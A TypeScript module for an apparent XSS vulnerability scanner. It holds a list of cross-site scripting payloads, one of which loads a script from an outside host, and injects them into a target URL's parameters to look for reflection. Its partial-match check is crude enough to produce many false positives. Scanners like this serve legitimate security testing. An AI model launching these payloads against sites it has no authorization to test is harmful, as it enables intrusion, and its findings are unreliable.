import { normalizeUrl } from './apiUtils';
import { corsProxy } from './corsProxy';

export interface XSSScanResult {
  vulnerable: boolean;
  testedPayloads: number;
  vulnerabilities: Array<{
    payload: string;
    location: string;
    severity: 'critical' | 'high' | 'medium' | 'low';
    type: string;
    evidence?: string;
    parameter?: string;
  }>;
  tested: boolean;
}

// Real XSS payloads used by professional pentesters
const XSS_PAYLOADS = [
  // Basic XSS
  { payload: '<script>alert(1)</script>', type: 'Script Tag', severity: 'critical' as const },
  { payload: '<script>alert(document.domain)</script>', type: 'Script Tag', severity: 'critical' as const },
  { payload: '<script src=//xss.rocks/xss.js></script>', type: 'External Script', severity: 'critical' as const },
  
  // Event handlers
  { payload: '<img src=x onerror=alert(1)>', type: 'Event Handler', severity: 'critical' as const },
  { payload: '<img src=x onerror=alert(document.cookie)>', type: 'Event Handler', severity: 'critical' as const },
  { payload: '<svg onload=alert(1)>', type: 'SVG Event', severity: 'critical' as const },
  { payload: '<body onload=alert(1)>', type: 'Body Event', severity: 'high' as const },
  { payload: '<input onfocus=alert(1) autofocus>', type: 'Input Event', severity: 'high' as const },
  
  // Attribute breaking
  { payload: '"><script>alert(1)</script>', type: 'Attribute Break', severity: 'critical' as const },
  { payload: "'><script>alert(1)</script>", type: 'Attribute Break', severity: 'critical' as const },
  { payload: '"><img src=x onerror=alert(1)>', type: 'Attribute Break + Event', severity: 'critical' as const },
  { payload: "' onmouseover='alert(1)", type: 'Attribute Injection', severity: 'high' as const },
  
  // JavaScript protocol
  { payload: 'javascript:alert(1)', type: 'JavaScript Protocol', severity: 'high' as const },
  { payload: 'javascript:alert(document.domain)', type: 'JavaScript Protocol', severity: 'high' as const },
  
  // Advanced payloads
  { payload: '<iframe src="javascript:alert(1)">', type: 'Iframe Injection', severity: 'critical' as const },
  { payload: '<object data="javascript:alert(1)">', type: 'Object Injection', severity: 'high' as const },
  { payload: '<embed src="javascript:alert(1)">', type: 'Embed Injection', severity: 'high' as const },
  { payload: '<details open ontoggle=alert(1)>', type: 'Details Event', severity: 'medium' as const },
  { payload: '<marquee onstart=alert(1)>', type: 'Marquee Event', severity: 'medium' as const },
  
  // Filter bypass
  { payload: '<scr<script>ipt>alert(1)</scr</script>ipt>', type: 'Filter Bypass', severity: 'high' as const },
  { payload: '<img src=x onerror="alert(1)">', type: 'Event Handler', severity: 'critical' as const },
  { payload: '<svg/onload=alert(1)>', type: 'SVG Event', severity: 'critical' as const },
  
  // Encoded payloads
  { payload: '%3Cscript%3Ealert(1)%3C/script%3E', type: 'URL Encoded', severity: 'high' as const },
  { payload: '&#60;script&#62;alert(1)&#60;/script&#62;', type: 'HTML Encoded', severity: 'high' as const },
];

const checkReflection = (response: string, payload: string): { reflected: boolean; context: string; evidence: string; encoded: boolean } => {
  const lowerResponse = response.toLowerCase();
  const lowerPayload = payload.toLowerCase();
  
  // Check for direct reflection
  if (lowerResponse.includes(lowerPayload)) {
    const index = lowerResponse.indexOf(lowerPayload);
    const context = response.substring(Math.max(0, index - 150), Math.min(response.length, index + payload.length + 150));
    
    return {
      reflected: true,
      context: 'Direct reflection - VULNERABLE',
      evidence: context.substring(0, 300),
      encoded: false,
    };
  }

  // Check for partial reflection (payload might be split)
  const payloadParts = payload.match(/<[^>]+>|alert\(|onerror=|onload=/gi);
  if (payloadParts) {
    for (const part of payloadParts) {
      if (lowerResponse.includes(part.toLowerCase())) {
        const index = lowerResponse.indexOf(part.toLowerCase());
        const context = response.substring(Math.max(0, index - 100), Math.min(response.length, index + 200));
        
        return {
          reflected: true,
          context: 'Partial reflection detected',
          evidence: context.substring(0, 300),
          encoded: false,
        };
      }
    }
  }

  // Check for HTML encoded reflection
  const htmlEncodedPayload = payload
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
  
  if (response.includes(htmlEncodedPayload)) {
    return {
      reflected: true,
      context: 'HTML encoded (likely safe)',
      evidence: 'Payload properly encoded',
      encoded: true,
    };
  }

  // Check for URL encoded reflection
  const urlEncodedPayload = encodeURIComponent(payload);
  if (response.includes(urlEncodedPayload)) {
    return {
      reflected: true,
      context: 'URL encoded (likely safe)',
      evidence: 'Payload URL encoded',
      encoded: true,
    };
  }

  return {
    reflected: false,
    context: 'Not reflected',
    evidence: 'Payload not found in response',
    encoded: false,
  };
};

export const performXSSScan = async (target: string): Promise<XSSScanResult> => {
  console.log(`[XSS Scan] Starting REAL vulnerability scan for ${target}`);
  
  const result: XSSScanResult = {
    vulnerable: false,
    testedPayloads: 0,
    vulnerabilities: [],
    tested: true,
  };

  try {
    const url = normalizeUrl(target);
    const urlObj = new URL(url);
    
    // Get parameters to test
    const params = new URLSearchParams(urlObj.search);
    const paramKeys = Array.from(params.keys());
    
    if (paramKeys.length === 0) {
      paramKeys.push('q'); // Default parameter
    }

    // Test each parameter with each payload
    for (const paramKey of paramKeys) {
      for (const { payload, severity, type } of XSS_PAYLOADS) {
        try {
          const testUrl = new URL(url);
          const testParams = new URLSearchParams(testUrl.search);
          testParams.set(paramKey, payload);
          testUrl.search = testParams.toString();

          console.log(`[XSS Scan] Testing ${type} on parameter '${paramKey}': ${payload.substring(0, 40)}...`);

          const response = await corsProxy.fetch(testUrl.toString());
          result.testedPayloads++;

          const text = await response.text();
          const reflection = checkReflection(text, payload);

          if (reflection.reflected && !reflection.encoded) {
            console.log(`[XSS Scan] ⚠️ ${severity.toUpperCase()}: XSS vulnerability detected! Type: ${type}, Context: ${reflection.context}`);
            result.vulnerable = true;
            result.vulnerabilities.push({
              payload,
              location: `URL parameter: ${paramKey}`,
              severity,
              type,
              evidence: reflection.evidence,
              parameter: paramKey,
            });
          } else if (reflection.reflected && reflection.encoded) {
            console.log(`[XSS Scan] ℹ️ Payload reflected but encoded (safe): ${paramKey}`);
          }

          await new Promise(resolve => setTimeout(resolve, 300));
        } catch (error: any) {
          console.warn(`[XSS Scan] Payload test failed: ${error.message}`);
        }
      }
    }

    console.log(`[XSS Scan] Complete: ${result.vulnerabilities.length} vulnerabilities found from ${result.testedPayloads} tests`);
    return result;
  } catch (error: any) {
    console.error('[XSS Scan] Critical error:', error);
    return {
      vulnerable: false,
      testedPayloads: 0,
      vulnerabilities: [],
      tested: false,
    };
  }
};